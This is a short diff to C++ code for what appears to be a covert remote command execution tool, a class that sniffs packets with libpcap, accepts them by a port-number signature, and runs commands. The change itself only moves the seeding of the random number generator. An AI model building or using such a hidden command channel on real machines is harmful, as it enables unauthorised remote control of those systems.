@@ -14,13 +14,13 @@
 #define DATA_START_STR "d-start["
 #define DATA_STOP_STR "]d-end"
 
+
 int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr daddr,
                                     const std::string &cmd) {
     unsigned short sport;
     unsigned short dport;
 
     // generate signature
-    srand(time(NULL));
     sport = (rand() % 55535) + 10000;
     dport = authenticator::generateSignature(sport);
 
@@ -73,6 +73,9 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     if (!authenticator::isValidSignature(ntohs(tcp->source), ntohs(tcp->dest))) {
         return;
     }
+
+    // init RNG
+    srand(time(NULL));
 
     // get payload
     unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
@@ -137,7 +140,6 @@ void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int d
     struct in_addr daddrIn;
     daddrIn.s_addr = daddr;
 
-    srand(time(NULL));
     unsigned short sport;
     unsigned short dport;
     FILE *fp;
